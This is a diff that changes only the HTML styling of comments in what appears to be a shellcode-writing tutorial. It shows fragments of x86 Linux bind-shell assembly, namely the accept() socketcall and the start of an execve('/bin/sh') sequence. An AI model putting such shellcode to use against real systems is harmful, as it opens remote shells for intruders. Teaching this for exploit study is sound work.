@@ -333,14 +333,14 @@ The <b>accept4</b> system call is available starting with <b>Linux 2.6.28</b> ; 
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#33cccc;">;;accept(sockfd, NULL, NULL);</span>
-mov al, 0x66     ; call SocketCall() in order to use the SYS_ACCEPT argument
-inc bl           ; increase the ebx from 0x4 to 0x5 
-                 ; which indicates the Accept() syscall 
-push edx         ; push NULL into the stack
-push edx         ; push NULL into the stack
-push edi         ; push sockfd descriptor 
-mov ecx, esp     ; point to Accept()
-int 0x80         ; call syscall interrupt to execute the arguments
+mov al, 0x66     <span style="color:#33cccc;">; call SocketCall() in order to use the SYS_ACCEPT argument</span>
+inc bl           <span style="color:#33cccc;">; increase the ebx from 0x4 to 0x5 </span>
+                 <span style="color:#33cccc;">; which indicates the Accept() syscall </span>
+push edx         <span style="color:#33cccc;">; push NULL into the stack</span>
+push edx         <span style="color:#33cccc;">; push NULL into the stack</span>
+push edi         <span style="color:#33cccc;">; push sockfd descriptor </span>
+mov ecx, esp     <span style="color:#33cccc;">; point to Accept()</span>
+int 0x80         <span style="color:#33cccc;">; call syscall interrupt to execute the arguments</span>
 </pre>
 
 ### Dup2 Function Synopsis :
@@ -390,7 +390,7 @@ int execve(const char *filename, char *const&nbsp;argv[], char *const&nbsp;envp[
 ### Execve
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-;; execve("/bin/sh", NULL, NULL);
+<span style="color:#33cccc;">;; execve("/bin/sh", NULL, NULL);</span>
 xor eax, eax    <span style="color:#33cccc;">; zero out the eax register </span>
 push eax        <span style="color:#33cccc;">; push NULL into the stack </span>
 push 0x68732f2f <span style="color:#33cccc;">; push "hs//" in reverse order into stack </span>
